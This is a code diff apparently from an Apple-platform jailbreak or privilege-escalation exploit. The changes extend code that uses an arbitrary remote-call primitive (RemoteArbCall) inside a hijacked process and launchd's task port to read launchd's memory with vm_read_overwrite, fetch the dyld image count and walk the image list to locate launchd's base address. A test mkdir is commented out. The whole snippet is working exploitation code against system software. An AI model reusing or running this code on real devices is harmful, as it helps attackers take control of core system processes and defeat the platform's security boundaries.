@@ -160,8 +160,8 @@ vm_offset_t findSbinLaunchdOff(void) {
         printf("Mapped memory at 0x%lx\n", map);
         
         // Test mkdir
-        RemoteWriteString(map, "/tmp/.it_works");
-        RemoteArbCall(mkdir, map, 0700);
+//        RemoteWriteString(map, "/tmp/.it_works");
+//        RemoteArbCall(mkdir, map, 0700);
         
         // Get my task port
         mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
@@ -217,6 +217,15 @@ vm_offset_t findSbinLaunchdOff(void) {
         remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
         printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
         
+        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
+        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
+            return;
+        }
+        uint32_t infoArrayCount = RemoteRead32(map);
+        printf("launchd infoArrayCount: %u\n", infoArrayCount);
+        
         //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
         kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
         if (kr != KERN_SUCCESS) {
@@ -227,7 +236,7 @@ vm_offset_t findSbinLaunchdOff(void) {
         // Enumerate images to find launchd base
         vm_address_t launchd_base = 0;
         vm_address_t infoArray = RemoteRead64(map);
-        for (int i = 0; i < 10; i++) {
+        for (int i = 0; i < infoArrayCount; i++) {
             kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
             uint64_t base = RemoteRead64(map);
             if (base % page_size) {
